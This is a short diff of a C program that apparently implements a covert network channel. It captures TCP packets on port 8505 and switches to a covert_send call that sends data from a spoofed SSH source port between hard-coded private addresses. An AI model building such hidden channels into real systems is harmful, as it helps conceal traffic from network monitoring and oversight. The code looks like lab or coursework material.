@@ -1,20 +1,9 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <pcap.h>
-#include <errno.h>
-#include <string.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <netinet/if_ether.h>
-#include <netinet/ether.h>
-#include "./src/encrypt_utils.h"
-#include "./src/socketwrappers.h"
 #include "main.h"
 
 #define FILTER "tcp and port 8505"
 #define PAYLOAD_KEY "8505"
 #define ADDRESS "192.168.1.13"
+#define ADDRESS_LOCAL "192.168.1.3"
 #define PORT "8505"
 #define BUFFERSIZE 1024
 
@@ -37,11 +26,19 @@ void SendPayload(const unsigned char *tcp_payload);
 
 int main(int argc, char **argv){
     char *c = "c";
+    char *sip = "192.168.1.3";
+    char *dip = "192.168.1.13";
+    unsigned short sport = 22;
+    unsigned short dport = 8505;
+    char *data = "hello";
+
+
     if(strcmp(argv[1],c) == 0){
-        unsigned char encrypted[sizeof(struct payload)];
-        char hello[BUFFERSIZE] = "hello";
-        CreatePayload(hello, encrypted);
-        SendPayload(encrypted);
+//        unsigned char encrypted[sizeof(struct payload)];
+//        char hello[BUFFERSIZE] = "hello";
+        //CreatePayload(hello, encrypted);
+        //SendPayload(encrypted);
+        covert_send(sip, dip, dport, sport, data);
         exit(1);
     } else {
         Packetcapture();
